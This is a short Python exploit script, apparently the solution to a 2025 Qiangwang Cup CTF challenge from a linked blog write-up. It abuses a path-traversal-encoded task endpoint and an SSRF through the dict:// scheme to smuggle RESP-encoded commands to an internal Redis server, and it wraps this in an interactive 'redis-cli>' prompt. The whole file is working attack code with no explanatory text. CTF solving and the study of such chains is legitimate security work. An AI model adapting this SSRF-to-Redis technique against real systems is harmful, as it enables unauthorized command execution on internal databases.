# https://blog.potatowo.top/2025/10/20/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E7%BA%BF%E4%B8%8A%E5%88%9D%E8%B5%9Bwp/
import json
import requests

URL = "http://127.0.0.1:5001"

def to_resp(command_line: str) -> str:
    args = command_line.strip().split()
    resp = f"*{len(args)}\r\n"
    for arg in args:
        resp += f"${len(arg)}\r\n{arg}\r\n"
    return resp + "\r\n\r\n\r\n\r\n*3"

def exp(verb):
    # print(verb)
    r = requests.post(
        url=URL+ "/tasks/fetch/%2e%2e%2f%61",
        json={
            "url": "dict://127.0.0.1:6379/",
            "verb": verb
        }
    )
    task_id = r.json().get('task_id')
    # print(task_id)
    r = requests.get(
        url=URL+ "/tasks/result",
        params={
            "id": task_id
        }
    )
    res = r.json()['result']['preview']
    return res



if __name__ == "__main__":
    while True:
        cmd = input("redis-cli> ")
        if cmd.lower() in ('exit', 'quit'):
            break
        resp_str = to_resp(cmd)
        res = exp(resp_str)
        print(res)